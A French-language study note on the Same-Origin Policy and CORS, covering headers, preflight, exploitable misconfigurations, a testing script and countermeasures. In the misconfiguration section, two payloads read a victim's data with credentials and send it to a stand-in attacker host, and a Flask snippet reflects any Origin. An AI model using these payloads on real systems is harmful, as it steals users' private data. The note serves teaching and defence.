---
title: Same-Origin Policy et CORS
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [sop, cors, same-origin, web, sécurité, api]
date: 2026-03-22
---

# Same-Origin Policy et CORS

## Same-Origin Policy (SOP)

La Same-Origin Policy est le mécanisme de sécurité fondamental des navigateurs. Elle empêche un script d'une origine d'accéder aux ressources d'une autre origine.

### Définition d'une origine

Deux URLs partagent la même origine si et seulement si le **schéma**, le **domaine** et le **port** sont identiques.

```
URL de référence : https://site.com/page

https://site.com/autre      → Même origine (seul le chemin diffère)
http://site.com/page        → Origine différente (schéma HTTP ≠ HTTPS)
https://sub.site.com/page   → Origine différente (sous-domaine différent)
https://site.com:8080/page  → Origine différente (port différent)
https://autresite.com/page  → Origine différente (domaine différent)
```

### Ce que la SOP bloque

```javascript
// Sur evil.com — tenter de lire la réponse d'une requête cross-origin
fetch('https://bank.com/api/balance')
    .then(r => r.json())
    .then(data => console.log(data));
// ↑ La requête PART bien, mais le navigateur bloque la LECTURE de la réponse

// XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bank.com/profile');
xhr.send();
// xhr.responseText → bloqué par la SOP
```

### Ce que la SOP ne bloque pas

```html
<!-- Chargement de ressources cross-origin → toujours permis -->
<script src="https://cdn.example.com/lib.js"></script>
<img src="https://images.example.com/photo.jpg">
<link rel="stylesheet" href="https://cdn.example.com/style.css">

<!-- Les formulaires peuvent envoyer des données cross-origin (sans lire la réponse) -->
<form action="https://bank.com/transfer" method="POST">
    <!-- → C'est pourquoi le CSRF est possible -->
</form>

<!-- Iframes : chargement possible, mais accès au contenu bloqué -->
<iframe src="https://bank.com/dashboard"></iframe>
<!-- iframe.contentDocument → SecurityError -->
```

## CORS (Cross-Origin Resource Sharing)

CORS est le mécanisme par lequel un serveur autorise explicitement certaines origines à accéder à ses ressources cross-origin.

### Flux CORS simple

```
Requête simple (GET, POST avec Content-Type text/plain|form|multipart) :

Navigateur → Serveur :
GET /api/data HTTP/1.1
Origin: https://app.com         ← Le navigateur ajoute automatiquement

Serveur → Navigateur :
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.com    ← Autorisation
                                                 (ou * pour tout autoriser)

Si l'en-tête est absent ou ne correspond pas → navigateur bloque la réponse
```

### Flux CORS preflight

Les requêtes "non simples" (PUT, DELETE, JSON, headers custom) déclenchent un preflight OPTIONS :

```
Navigateur → Serveur (preflight) :
OPTIONS /api/data HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type

Serveur → Navigateur :
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400       ← Cache du preflight (secondes)

Si le preflight est approuvé → la vraie requête est envoyée
```

### En-têtes CORS

| En-tête | Direction | Rôle |
|---|---|---|
| `Origin` | Requête | Origine du client (ajouté par le navigateur) |
| `Access-Control-Allow-Origin` | Réponse | Origine(s) autorisée(s) |
| `Access-Control-Allow-Methods` | Réponse | Méthodes autorisées |
| `Access-Control-Allow-Headers` | Réponse | Headers autorisés |
| `Access-Control-Allow-Credentials` | Réponse | Autorise l'envoi de cookies |
| `Access-Control-Expose-Headers` | Réponse | Headers visibles côté client |
| `Access-Control-Max-Age` | Réponse | Durée de cache du preflight |

### Credentials (cookies)

Par défaut, les requêtes cross-origin n'envoient pas les cookies. Pour les activer :

```javascript
// Côté client — activer l'envoi de credentials
fetch('https://api.site.com/data', {
    credentials: 'include'  // envoie les cookies
});

// XMLHttpRequest
xhr.withCredentials = true;
```

```
Côté serveur — obligation :
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.com    ← * INTERDIT avec credentials
```

## Mauvaises configurations CORS exploitables

### 1. Wildcard (*) avec credentials

```
# Impossible selon la spec (le navigateur refuse)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### 2. Reflection de l'Origin sans validation

```python
# Code vulnérable — reflète n'importe quelle origine
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin  # ← Dangereux
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

```javascript
// Exploitation depuis evil.com
fetch('https://api.victime.com/profile', {
    credentials: 'include'  // Les cookies de session sont envoyés
})
.then(r => r.json())
.then(data => {
    // L'attaquant lit les données privées de la victime
    fetch('https://attaquant.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### 3. Validation par préfixe ou suffixe

```python
# Code vulnérable — validation insuffisante
def is_allowed_origin(origin):
    return origin.endswith('.site.com')  # ← attaquant-site.com passe !

# Ou :
    return origin.startswith('https://site.com')  # ← https://site.com.evil.com passe !
```

### 4. Origine null autorisée

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<!-- L'origine "null" est envoyée par les iframes sandbox, les fichiers locaux -->
<!-- Un attaquant peut forcer l'origine null via une iframe sandboxée -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>
fetch('https://api.victime.com/data', {credentials: 'include'})
.then(r => r.json())
.then(d => fetch('https://attaquant.com/?data=' + JSON.stringify(d)));
</script>">
</iframe>
```

### 5. Sous-domaines vulnérables (XSS + CORS)

```
# Configuration permettant tous les sous-domaines
Access-Control-Allow-Origin: https://sub.site.com
Access-Control-Allow-Credentials: true

# Si sub.site.com a une XSS → l'attaquant contrôle un script depuis sub.site.com
# → Ce script peut lire les données de l'API principale (même domaine parent)
```

## Test et détection

```bash
# Test de reflection d'origin
curl -H "Origin: https://evil.com" https://api.target.com/data -I
# Si Access-Control-Allow-Origin: https://evil.com → vulnérable

# Test avec origin null
curl -H "Origin: null" https://api.target.com/data -I

# Test de validation par regex — injecter un domaine qui pourrait passer
curl -H "Origin: https://evil-target.com" https://api.target.com/data -I
curl -H "Origin: https://target.com.evil.com" https://api.target.com/data -I
```

```python
# Script de test complet
import requests

target = "https://api.target.com/sensitive"
origins_to_test = [
    "https://evil.com",
    "null",
    "https://evil-target.com",
    "https://target.com.evil.com",
    "https://eviltarget.com",
    "http://target.com",  # HTTP au lieu de HTTPS
]

for origin in origins_to_test:
    r = requests.get(target, headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "absent")
    acac = r.headers.get("Access-Control-Allow-Credentials", "absent")
    if acao == origin:
        print(f"[VULN] Origin reflétée : {origin} | Credentials: {acac}")
    else:
        print(f"[OK]   {origin} → ACAO: {acao}")
```

## Contre-mesures

```python
# Python/Flask — whitelist stricte
ALLOWED_ORIGINS = {
    'https://app.site.com',
    'https://www.site.com',
}

@app.after_request
def cors_headers(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Vary'] = 'Origin'  # Important pour le cache
        if needs_credentials(request):
            response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# Ne jamais utiliser :
# response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
# Sans validation
```

```nginx
# Nginx — whitelist avec map
map $http_origin $cors_origin {
    default "";
    "https://app.site.com"  "$http_origin";
    "https://www.site.com"  "$http_origin";
}

server {
    add_header Access-Control-Allow-Origin $cors_origin always;
    add_header Vary "Origin" always;
}
```

```
Checklist CORS :
✓ Maintenir une whitelist explicite d'origines autorisées
✓ Ajouter Vary: Origin pour éviter que les caches servent une réponse à la mauvaise origine
✓ Ne jamais utiliser * avec Access-Control-Allow-Credentials: true
✓ Ne jamais autoriser l'origine null en production
✓ Valider l'Origin complète (pas seulement un préfixe/suffixe)
✓ Restreindre les méthodes et headers aux seuls nécessaires
✓ Tester régulièrement les sous-domaines (surface d'attaque via XSS)
```
